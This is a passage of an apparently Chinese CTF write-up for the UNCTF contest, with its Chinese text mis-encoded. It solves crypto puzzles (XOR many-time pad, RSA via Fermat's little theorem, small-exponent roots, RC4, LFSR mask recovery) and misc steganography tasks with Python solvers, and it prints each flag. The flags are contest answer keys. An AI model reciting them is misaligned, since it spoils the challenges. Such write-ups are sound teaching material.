class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">strxor</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ <span class="built_in">ord</span>(y)) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">target_fix</span>(<span class="params">target_cipher</span>):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;-------begin-------&#x27;</span></span><br><span class="line"></span><br><span class="line">    final_key = [<span class="literal">None</span>]*<span class="number">150</span></span><br><span class="line">    known_key_positions = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> current_index, ciphertext <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphers):</span><br><span class="line">        counter = collections.Counter()</span><br><span class="line">        <span class="keyword">for</span> index, ciphertext2 <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphers):</span><br><span class="line">            <span class="keyword">if</span> current_index != index:</span><br><span class="line">                <span class="keyword">for</span> indexOfChar, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(strxor(ciphertext.decode(<span class="string">&#x27;hex&#x27;</span>), ciphertext2.decode(<span class="string">&#x27;hex&#x27;</span>))):</span><br><span class="line">                    <span class="keyword">if</span> char <span class="keyword">in</span> string.printable <span class="keyword">and</span> char.isalpha(): counter[indexOfChar] += <span class="number">1</span></span><br><span class="line">        knownSpaceIndexes = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ind, val <span class="keyword">in</span> counter.items():</span><br><span class="line">            <span class="keyword">if</span> val &gt;= <span class="number">7</span>: knownSpaceIndexes.append(ind)</span><br><span class="line"></span><br><span class="line">        xor_with_spaces = strxor(ciphertext.decode(<span class="string">&#x27;hex&#x27;</span>),<span class="string">&#x27; &#x27;</span>*<span class="number">150</span>)</span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> knownSpaceIndexes:</span><br><span class="line">            final_key[index] = xor_with_spaces[index].encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">            known_key_positions.add(index)</span><br><span class="line"></span><br><span class="line">    final_key_hex = <span class="string">&#x27;&#x27;</span>.join([val <span class="keyword">if</span> val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">&#x27;00&#x27;</span> <span class="keyword">for</span> val <span class="keyword">in</span> final_key])</span><br><span class="line">    output = strxor(target_cipher.decode(<span class="string">&#x27;hex&#x27;</span>),final_key_hex.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Fix this sentence:&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join([char <span class="keyword">if</span> index <span class="keyword">in</span> known_key_positions <span class="keyword">else</span> <span class="string">&#x27;*&#x27;</span> <span class="keyword">for</span> index, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(output)])+<span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;------end------&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ciphers:</span><br><span class="line">    target_fix(i)</span><br></pre></td></tr></table></figure><p>è¡¥å…¨å¯èƒ½çš„æ˜æ–‡å•è¯ï¼Œåå¤å°è¯•å¾—åˆ°keyï¼š<code>UNCTF&#123;Y0u_are_very_Clever!!!&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="ä»Šæ™šåƒä»€ä¹ˆ"><a href="#ä»Šæ™šåƒä»€ä¹ˆ" class="headerlink" title="ä»Šæ™šåƒä»€ä¹ˆ"></a>ä»Šæ™šåƒä»€ä¹ˆ</h3><blockquote><p>å…¨éƒ¨å¤§å†™</p></blockquote><p><code>10000</code> æ¢ <code>A</code>ï¼Œ<code>00000</code> æ¢ <code>B</code>ï¼ŒåŸ¹æ ¹å¯†ç è§£å¾— <code>CRYPROISFUN</code>ã€‚</p><p>â€‹    </p><h3 id="Today-is-Thursday-V-me-50"><a href="#Today-is-Thursday-V-me-50" class="headerlink" title="Today_is_Thursday_V_me_50"></a>Today_is_Thursday_V_me_50</h3><p>æŒ‰ä»£ç é€»è¾‘è¿˜åŸå³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;unctf&quot;</span></span><br><span class="line">key1 = <span class="string">b&#x27;Today_is_Thursday_V_me_50&#x27;</span></span><br><span class="line">key1_num = bytes_to_long(key1)</span><br><span class="line"></span><br><span class="line">c = <span class="string">b&#x27;Q\x19)T\x18\x1b(\x03\t^c\x08QiF&gt;Py\x124DNg3P&#x27;</span></span><br><span class="line"></span><br><span class="line">random.seed(key1_num)</span><br><span class="line">message = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    temp_num = random.randint(<span class="number">1</span>,<span class="number">128</span>)</span><br><span class="line">    message += long_to_bytes(temp_num ^ i)</span><br><span class="line"></span><br><span class="line">guess = [i <span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(name, <span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    what = guess.pop(<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="string">&#x27;&#x27;</span>.join(j <span class="keyword">for</span> j <span class="keyword">in</span> what)</span><br><span class="line">mask = strxor(<span class="number">5</span>*name.encode(),key1)</span><br><span class="line"><span class="built_in">print</span>(mask)</span><br><span class="line">out = strxor(mask,message)</span><br><span class="line"><span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;unctf&#123;1_l0ve_Thurs4Ay!!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Fermat"><a href="#Fermat" class="headerlink" title="Fermat"></a>Fermat</h3><p>å·²çŸ¥ $g+x=x \cdot p$ï¼Œåˆ™ $g=x(p-1)$ï¼Œç»“åˆè´¹é©¬å°å®šç†ï¼Œæœ‰ </p><p>$a^g \bmod p = a^{ x(p-1)} \bmod p = (a^x)^{(p-1)} \bmod p = 1$ ï¼ˆ$a$ ä¸ºä»»æ„æ•´æ•°ï¼‰</p><p>å– $a=2$ï¼Œå³ $2^g \bmod p = 1$ï¼Œ$2^g-1=k_1p$ï¼Œ</p><p>è€Œ $2^g \bmod p = (2^g \bmod n) \bmod p=1$ï¼Œåˆ™ $2^g \bmod n = 1+k_2p$ï¼Œ</p><p>æ•… $(2^g \bmod n)-1=k_2p$ ä¹Ÿæ˜¯ $p$ çš„å€æ•°ï¼Œåˆ™æœ‰ $p=\gcd\Big((2^g \bmod n)-1,n\Big)$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">19793392713544070457027688479915778034777978273001720422783377164900114996244094242708846944654400975309197274029725271852278868848866055341793968628630614866044892220651519906766987523723167772766264471738575578352385622923984300236873960423976260016266837752686791744352546924090533029391012155478169775768669029210298020072732213084681874537570149819864200486326715202569620771301183541168920293383480995205295027880564610382830236168192045808503329671954996275913950214212865497595508488636836591923116671959919150665452149128370999053882832187730559499602328396445739728918488554797208524455601679374538090229259</span></span><br><span class="line">c = <span class="number">388040015421654529602726530745444492795380886347450760542380535829893454552342509717706633524047462519852647123869277281803838546899812555054346458364202308821287717358321436303133564356740604738982100359999571338136343563820284214462840345638397346674622692956703291932399421179143390021606803873010804742453728454041597734468711112843307879361621434484986414368504648335684946420377995426633388307499467425060702337163601268480035415645840678848175121483351171989659915143104037610965403453400778398233728478485618134227607237718738847749796204570919757202087150892548180370435537346442018275672130416574430694059</span></span><br><span class="line">g = <span class="number">28493930909416220193248976348190268445371212704486248387964331415565449421099615661533797087163499951763570988748101165456730856835623237735728305577465527656655424601018192421625513978923509191087994899267887557104946667250073139087563975700714392158474439232535598303396614625803120915200062198119177012906806978497977522010955029535460948754300579519507100555238234886672451138350711195210839503633694262246536916073018376588368865238702811391960064511721322374269804663854748971378143510485102611920761475212154163275729116496865922237474172415758170527875090555223562882324599031402831107977696519982548567367160</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">p = gcd(<span class="built_in">pow</span>(<span class="number">2</span>,g,n)-<span class="number">1</span>,n)</span><br><span class="line">q = n//p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;UNCTF&#123;DO_y0u_Fermat_1ittle_theOrem&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="è¶…çº§åŠ å€"><a href="#è¶…çº§åŠ å€" class="headerlink" title="è¶…çº§åŠ å€"></a>è¶…çº§åŠ å€</h3><p>æ ¹æ®â€åŠ å€â€œï¼Œè„‘æ´å¤§çŒœå°æŒ‡æ•° $e$ æ”»å‡»ï¼Œå¼€æ–¹å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c=<span class="number">364948328635256862807658970246807356738683637564484151183420122283833769442806688034764747801289594899501872549412387392353830842750341246881725380294423193634163908298756097744423833369487321345708403908358587818931161805853745707954962941881920962518131654701890269025702523666873057795301975752113492236398361724355733200822450695761</span></span><br><span class="line">m=gmpy2.iroot(c,<span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;it_is_much_bigger_than_before&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="EZcry"><a href="#EZcry" class="headerlink" title="EZcry"></a>EZcry</h3><blockquote><p>æç¤º1ï¼šæµå¯†ç </p></blockquote><p>å¯†æ–‡ï¼š<code>dd9f58b37289edc2c40133ab9f0439c140aafe7cfd501f8c3d79b1856c9bda598ce34a02a57c</code>ï¼Œ</p><p>keyï¼š<code>12345678</code></p><p>æ ¹æ®æç¤ºæµ‹è¯•å¸¸è§æµå¯†ç ï¼ŒRC4æˆåŠŸè§£å‡º <code>flag&#123;83e429d991d24c548b9dbd256975d0d5&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="easy-lfsr"><a href="#easy-lfsr" class="headerlink" title="easy_lfsr"></a>easy_lfsr</h3><blockquote><p>ä½ èƒ½æ±‚å‡ºæˆ‘çš„maskå—</p></blockquote><p>æ ¹æ®512çº§LFSRè¿ç»­1024ä¸ªbitçš„äº§å‡ºï¼Œæ±‚æ©ç ã€‚</p><p>ç”±äºLFSRçš„æ€§è´¨ï¼Œæ¯ä¸€æ¬¡ç”Ÿæˆçš„bitéƒ½ä¼šåŠ åˆ°å‘é‡çš„æœ€ä½ä½ï¼ŒåŒæ—¶ä¸¢å¼ƒæ‰æœ€é«˜ä½bitã€‚äºæ˜¯åœ¨è¿ç»­512æ¬¡ç”Ÿæˆä¹‹åï¼ŒåŸæœ‰çš„ KEY æ‰€æœ‰çš„ä½éƒ½è¢«ä¸¢å¼ƒï¼ŒLFSRçš„çŠ¶æ€ä¼šè½¬ä¸ºå·²çŸ¥çš„512ä¸ªbitï¼Œå³æ‰€ç»™å‡ºçš„ä¸²çš„å‰512ä½ã€‚ä¹‹åå®Œå…¨çŸ¥é“äº†LFSRçš„çŠ¶æ€ï¼Œåªéœ€è¦åœ¨å·²çŸ¥çŠ¶æ€çš„æƒ…å†µä¸‹æ¨å‡ºæ©ç ã€‚</p><p>æ¯è¿ç»­512ä¸ªbitå¯ä»¥ç”Ÿæˆä¸‹ä¸€ä¸ªbitã€‚å·²çŸ¥è¿™512ä¸ª bitï¼Œä¹ŸçŸ¥é“ä¸‹ä¸€ä¸ªbitï¼Œä½†æ©ç æœªçŸ¥ã€‚é—®é¢˜ç­‰ä»·äºï¼šåœ¨ $\text{GF}(2)$ ä¸Šï¼Œ512ä½çš„å·²çŸ¥çš„çŠ¶æ€å‘é‡ï¼Œç‚¹ä¹˜512ä½çš„æ©ç å‘é‡ï¼Œå¾—åˆ°çš„æ•°å·²çŸ¥ï¼Œæ±‚æ©ç å‘é‡ã€‚çŠ¶æ€å‘é‡æœ‰512ç»´ï¼Œåˆ™æœ‰512ç»„æ–¹ç¨‹ã€‚</p><p>è§£æ–¹ç¨‹ç»„çš„é—®é¢˜è½¬åŒ–ä¸ºçŸ©é˜µæ±‚é€†é—®é¢˜ã€‚æŠŠLFSRçŠ¶æ€é€è¡Œå†™åœ¨çŸ©é˜µä¸Šï¼Œå½¢æˆçš„çŸ©é˜µè®°ä¸º $M$ï¼ŒæŠŠLFSRæ¯æ¬¡æ‰€ç”Ÿæˆçš„ç»“æœæ‹¼æˆçš„å‘é‡è®°ä¸º $T$ï¼Œåˆ™æ©ç å‘é‡ $v$ æœ‰ï¼š$M \cdot v = T$ï¼Œå³ $v=M^{-1} \cdot T$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">r1 = <span class="number">1261758973831852037364036680281442789461569523587512977925542995725854499352478233840720068310447535900840104847512878006505600998481136843381903570688446</span></span><br><span class="line">r2 = <span class="number">1563853949934744587783542352813857485182445023523734908403585490477271641971239139925690033798570364214960692427704824920072270819031456154655408096237757</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    s = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">bin</span>(r1)[<span class="number">2</span>:].rjust(<span class="number">512</span>,<span class="string">&#x27;0&#x27;</span>)+<span class="built_in">bin</span>(r2)[<span class="number">2</span>:].rjust(<span class="number">512</span>,<span class="string">&#x27;0&#x27;</span>)]</span><br><span class="line"></span><br><span class="line">    M = matrix(GF(<span class="number">2</span>), <span class="number">512</span>, <span class="number">512</span>)</span><br><span class="line">    T = vector(GF(<span class="number">2</span>), <span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s) - <span class="number">512</span>):</span><br><span class="line">        M[i] = s[i : i + <span class="number">512</span>]</span><br><span class="line">        T[i] = s[i+<span class="number">512</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mask = M.inverse() * T</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, (mask))),<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">flag = test()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(flag)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&quot;flag&#123;09de44be-5b3d-11ed-b764-ac1203ab14d7&#125;\xb0vgf\x96\xdf`v\xc6d@\x14\xf7\x98\xaf\xac&#x27;\xf8K\xbb+\x00&quot;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="# Misc"></a># Misc</h2><h3 id="magic-word"><a href="#magic-word" class="headerlink" title="magic_word"></a>magic_word</h3><blockquote><p>ä¹±ç +é›¶å®½éšå†™</p></blockquote><p>Wingdingså­—ä½“è½¬æ­£å¸¸å­—ä½“å¦‚å®‹ä½“ï¼Œå…¨é€‰å†…å®¹å¤åˆ¶ï¼Œé›¶å®½éšå†™å·¥å…·æå–å¾— <code>unctf&#123;We1come_new_ctfer&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="æ‰¾å¾—åˆ°æˆ‘å—"><a href="#æ‰¾å¾—åˆ°æˆ‘å—" class="headerlink" title="æ‰¾å¾—åˆ°æˆ‘å—"></a>æ‰¾å¾—åˆ°æˆ‘å—</h3><p>ä»¥å‹ç¼©åŒ…æ–¹å¼æ‰“å¼€docxï¼Œåœ¨document.xmlä¸­å‘ç°ï¼š</p><p><code>&lt;w:rFonts w:hint=&quot;default&quot; w:cs=&quot;flag&#123;You_find_me!&#125;&quot; w:asciiTheme=&quot;minorAscii&quot; w:hAnsiTheme=&quot;minorAscii&quot;/&gt;</code></p><p>â€‹    </p><h3 id="syslog"><a href="#syslog" class="headerlink" title="syslog"></a>syslog</h3><p>åœ¨logæ–‡ä»¶ä¸­æ‰¾åˆ°å…³é”®ä¸€è¡Œï¼š</p><p><code>Nov  2 02:34:14 ubuntu bi0x: [Password] cGFzc3dvcmQgaXMgVTZudTJfaTNfYjNTdA==</code></p><p>base64è§£ç å¾—åˆ°å¯†ç  <code>password is U6nu2_i3_b3St</code>ï¼Œè§£å‹å¾—flagï¼š<code>unctf&#123;N1_sH3_D0n9_L0g_dE!&#125;</code></p><p>â€‹    </p><h3 id="In-the-Morse-Garden"><a href="#In-the-Morse-Garden" class="headerlink" title="In_the_Morse_Garden"></a>In_the_Morse_Garden</h3><p>PDFä¸­å…¨é€‰å¤åˆ¶å‡ºæ–‡å­—ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">UNCTF&#123;5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm</span><br><span class="line">+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6Qg5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k5</span><br><span class="line">46b5Y2h5be05Y2h546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlO</span><br><span class="line">WPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6Qg5L6d5Y+k5q+U5Y+k5L6d5Y+k</span><br><span class="line">5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOeOm</span><br><span class="line">+WNoeW3tOWNoeeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg546b5Y2h5be05Y</span><br><span class="line">2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDkvp3</span><br><span class="line">lj6Tmr5Tlj6Tkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg54</span><br><span class="line">6b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+kIOS+neWPpOavlOW</span><br><span class="line">PpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg5L6d5Y+k5q+U5Y</span><br><span class="line">+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6Tnjpvlja</span><br><span class="line">Hlt7TljaEg5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWN</span><br><span class="line">oSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHnjpvljaHlt7T</span><br><span class="line">ljaE=&#125;</span><br></pre></td></tr></table></figure><p>ä¸­é—´éƒ¨åˆ†base64è§£ç å¾—åˆ°çš„ <code>ä¾å¤æ¯”å¤</code> æ¢ä¸º <code>.</code>ï¼Œ<code>ç›å¡å·´å¡</code> æ¢ä¸º <code>-</code>ï¼Œå†æ‘©æ–¯å¯†ç è§£å¾— <code>WAN_AN_MAKA_BAKAAAAA!</code>ã€‚</p><p>â€‹    </p><h3 id="æ¸…å’Œfan"><a href="#æ¸…å’Œfan" class="headerlink" title="æ¸…å’Œfan"></a>æ¸…å’Œfan</h3><blockquote><p>å°wä¸€ç›´å¯¹çœŸäººäºŒæ¬¡å…ƒæ²¡å•¥æŠµæŠ—åŠ›ï¼Œå½“ä»–è§åˆ°æ¸…å’Œçš„æ—¶å€™ï¼Œå°wç›´å‘¼è¿™å°±æ˜¯å¿ƒåŠ¨çš„æ„Ÿè§‰ã€‚</p></blockquote><p>ç¬¬ä¸€å±‚ï¼Œæ ¹æ®å‹ç¼©åŒ…æ³¨é‡Šï¼Œå¯†ç ä¸ºæ¸…å’ŒBç«™uidä¸‹åˆ’çº¿æœ€é«˜æ’­æ”¾é‡è§†é¢‘å‘å¸ƒæ—¥æœŸï¼Œæ‰¾åˆ°å¯†ç  <code>836885_2022/05/20</code>ï¼›</p><p>ç¬¬äºŒå±‚ï¼Œpngå›¾ç‰‡LSBéšå†™ï¼Œæå–å‡º <code>password is :qq857488580</code>ï¼›</p><p>ç¬¬ä¸‰å±‚ï¼ŒéŸ³é¢‘æ–‡ä»¶SSTVï¼Œå¾—åˆ°å›¾ç‰‡ä¸­å¯†ç  <code>V@mpir3</code>ï¼›</p><p>æœ€åä¸€å±‚ï¼Œæ–‡æœ¬å†…é›¶å®½éšå†™ï¼Œç”¨åœ¨çº¿å·¥å…·æå–å¾—åˆ° <code>unctf&#123;wha1e_wants_a_girlfriend_like_alicia&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="èŠéº»å¼€é—¨"><a href="#èŠéº»å¼€é—¨" class="headerlink" title="èŠéº»å¼€é—¨"></a>èŠéº»å¼€é—¨</h3><p>å¸¦å¯†ç çš„LSBéšå†™ï¼š<code>python2 lsb.py extract flag.png xxx.txt key1</code></p><p>flag: <code>flag&#123;faf5bdd5-ba3d-11da-ad31-d33d75182f1b&#125;</code></p><p>â€‹    </p><h3 id="æˆ‘å°å¿ƒæµ·ä¹Ÿç»éé³ç±»"><a href="#æˆ‘å°å¿ƒæµ·ä¹Ÿç»éé³ç±»" class="headerlink" title="æˆ‘å°å¿ƒæµ·ä¹Ÿç»éé³ç±»"></a>æˆ‘å°å¿ƒæµ·ä¹Ÿç»éé³ç±»</h3><p>pngå›¾ç‰‡ä¸­æœ‰å­—ç¬¦ä¸² <code>F#S&lt;YIcHnAG;</code>ï¼Œbase92è§£ç  <code>flaginmd5</code>ï¼›å°¾éƒ¨ <code>RUFTWUxTQg==</code>ï¼Œbase64è§£ç  <code>EASYLSB</code>ã€‚</p><p>zstegæŸ¥çœ‹ä¸åˆ°æœ‰ç”¨ä¿¡æ¯ï¼Œç”¨cloaked-pixelå¸¦å¯†ç çš„LSBæå–ï¼š<code>python2 lsb.py extract 1.png out.txt flaginmd5</code>ï¼Œå¾—åˆ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8FA14CDD754F91CC6554C9E71929CCE72DB95E8E1A9267B7A1188556B2013B330CC175B9C0F1B6A831C399E269772661B2F5FF47436671B6E533D8DC3614845DF95B70FDC3088560732A5AC135644506F1290186A5D0B1CEAB27F4E77C0C5D68E1671797C52E15F763380B45E841EC322DB95E8E1A9267B7A1188556B2013B334A8A08F09D37B73795649038408B5F33D95679752134A2D9EB61DBD7B91C4BCC6F8F57715090DA2632453988D9A1501BE1671797C52E15F763380B45E841EC32B14A7B8059D9C055954C92674CE60032E358EFA489F58062F10DD7316B65649ED95679752134A2D9EB61DBD7B91C4BCCB14A7B8059D9C055954C92674CE600326F8F57715090DA2632453988D9A1501B865C0C0B4AB0E063E5CAA3387C1A874103C7C0ACE395D80182DB07AE2C30F0344A8A08F09D37B73795649038408B5F33CBB184DD8E05C9709E5DCAEDAA0495CF</span><br></pre></td></tr></table></figure><p>æ ¹æ®å‰é¢çš„æç¤ºï¼Œè¿™ä¸²å­—ç¬¦ä¸²ä¸ºmd5å€¼çš„ç»„åˆï¼Œçˆ†ç ´ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;8FA14CDD754F91CC6554C9E71929CCE72DB95E8E1A9267B7A1188556B2013B330CC175B9C0F1B6A831C399E269772661B2F5FF47436671B6E533D8DC3614845DF95B70FDC3088560732A5AC135644506F1290186A5D0B1CEAB27F4E77C0C5D68E1671797C52E15F763380B45E841EC322DB95E8E1A9267B7A1188556B2013B334A8A08F09D37B73795649038408B5F33D95679752134A2D9EB61DBD7B91C4BCC6F8F57715090DA2632453988D9A1501BE1671797C52E15F763380B45E841EC32B14A7B8059D9C055954C92674CE60032E358EFA489F58062F10DD7316B65649ED95679752134A2D9EB61DBD7B91C4BCCB14A7B8059D9C055954C92674CE600326F8F57715090DA2632453988D9A1501B865C0C0B4AB0E063E5CAA3387C1A874103C7C0ACE395D80182DB07AE2C30F0344A8A08F09D37B73795649038408B5F33CBB184DD8E05C9709E5DCAEDAA0495CF&#x27;</span>.lower()</span><br><span class="line">s = [s[<span class="number">32</span>*i:<span class="number">32</span>*i+<span class="number">32</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)//<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    dic[md5(<span class="built_in">chr</span>(k).encode()).hexdigest()] = <span class="built_in">chr</span>(k)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">    flag += dic[k]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;welcome_to_misc&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="MY-PICTURE"><a href="#MY-PICTURE" class="headerlink" title="MY PICTURE"></a>MY PICTURE</h3><p>å°†datæ–‡ä»¶å¼‚æˆ–0x8eï¼Œè§£å‹å¾—åˆ°encode.pyï¼Œå†…ä¸ºå›¾ç‰‡åŠ 